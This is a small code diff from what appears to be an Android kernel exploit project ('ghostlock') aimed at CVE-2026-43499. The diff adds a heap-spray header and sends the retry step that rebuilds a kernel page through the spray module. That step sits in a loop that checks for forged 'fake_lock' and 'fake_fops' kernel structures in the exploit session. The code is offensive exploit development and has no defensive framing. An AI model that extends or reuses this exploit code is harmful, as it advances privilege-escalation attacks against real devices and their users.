@@ -132,6 +132,7 @@ namespace ghostlock::backend::cve_2026_43499::route::select_stack {
 #if defined(__ANDROID__)
 #include "memory/constants.hpp"
 
+#include "backend/cve_2026_43499/spray.hpp"
 #include "support/log.hpp"
 #include "support/decls.hpp"
 
@@ -431,7 +432,7 @@ namespace ghostlock::backend::cve_2026_43499::route::select_stack {
 
         for (int32_t attempt = 1; attempt <= attempts; attempt++) {
             if (attempt > 1) {
-                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
+                const uintptr_t rebuilt = spray::prepare_good_kernel_page(*request);
                 if (!rebuilt || !(ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_lock) ||
                     !(ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.fake_fops)) {
                     pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
